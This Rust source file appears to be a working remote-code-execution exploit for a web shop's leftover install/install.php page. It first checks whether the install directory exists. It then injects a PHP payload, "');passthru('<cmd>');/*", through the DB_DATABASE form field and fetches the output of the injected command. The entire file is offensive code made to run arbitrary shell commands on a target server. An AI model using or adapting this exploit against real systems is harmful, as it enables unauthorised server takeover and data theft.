//extern crate ureq;

use termion::color;
use ureq;
use ureq::Error;
use std::process;

pub fn exit_on_error(msg: &str) -> !{ 
    eprintln!("[-] {}Error: {}{}", color::Fg(color::Red), msg,  color::Fg(color::Reset));
    process::exit(-1);
}

pub fn testvuln(url: &str) {
    println!("[!] Checking Vulnerability status on: {}{}{}",color::Fg(color::Magenta),url,color::Fg(color::Reset));
    let install_url = if  url.chars().last().unwrap() == '/' {
        format!("{}{}",url,"install/install.php")
    } else {
        format!("{}{}",url,"/install/install.php")
    };
    println!("[!] Checking if Install Directory exists at: {}{}{}",color::Fg(color::Yellow),install_url,color::Fg(color::Reset));

    match ureq::get(install_url.as_str()).call(){
        Ok(_response) => println!("[+] {}Install Directory Found!\n{}[!] {}Server might be vulnerable!{}",color::Fg(color::Green),color::Fg(color::Reset),color::Fg(color::Cyan),color::Fg(color::Reset)),
        Err(Error::Status(code, _response)) => exit_on_error(format!("The Server responed with a code of: {}",code).as_str()) ,
        Err(_) => exit_on_error("Something weird happened :("),
        } 
}

pub fn exec_command(post_endpoint:&str,get_endpoint: &str, cmd: &str)-> Result<(), ureq::Error> {
    println!("⚙️ {}",cmd);
    let payload = format!("\"');passthru('{}');/*\"",cmd);

    match ureq::post(post_endpoint)
    .send_form(&[
        ("DIR_FS_DOCUMENT_ROOT", "./"),
        ("DB_DATABASE", payload.as_str()),
      ]){
        Ok(_)=> {
            let resp = ureq::get(get_endpoint).call()?.into_string()?;
            let split = resp.split('\n').skip(2);
            for s in split{
                println!("{}",s);
            }
        },
        Err(Error::Status(code, _response)) => exit_on_error(format!("The Server responed with a code of: {}",code).as_str()) ,
        Err(_) => exit_on_error("Something weird happened :("),
    }    

    Ok(())
}